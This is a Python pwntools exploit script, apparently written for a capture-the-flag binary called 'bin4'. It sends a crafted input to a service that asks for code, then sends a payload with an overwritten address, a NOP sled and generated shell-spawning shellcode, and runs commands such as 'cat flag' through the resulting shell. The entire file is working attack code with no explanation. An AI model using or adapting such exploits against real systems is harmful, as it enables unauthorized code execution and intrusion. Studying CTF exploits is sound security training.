from pwn import *

context(arch = 'i386' , os = 'linux', endian = 'little')
context.log_level = 'info'

def exp(debug,binary,msg,ip=0,port=0,timeout=1):
	if debug == 1:
		p = process(binary)
		# gdb.attach(p, 'b *0x080489BA\nb *0x08048A1F\nc')
	else:
		p = remote(ip, port,timeout=timeout)
	try:
		p.recvuntil('so give me the code\n',timeout=timeout)
		shellcode = ',[-!],[-!],[,!]'
		p.sendline(shellcode)
		shellcode = chr(0x61) + chr(0x10c - 0x61) + '\x01' + p32(0x080deb63) + '\x90' * 0x200 + asm(shellcraft.sh()) + '\x00'
		# p.send(chr(0x61))
		# p.send(chr(0x10c - 0x61))
		# for i in shellcode:
		# 	p.send(i)
		p.send(shellcode)

		p.sendline('echo 123')

		p.recvuntil('123',timeout=timeout)

		p.sendline(msg)

		p.sendline('echo 456')

		flag = p.recvuntil('456',timeout=timeout).replace('\n','')
		p.close()

		return flag[:-3]
	except:
		p.close()
		return ''

if __name__ == '__main__':
	print exp(1,'bin4','cat flag')
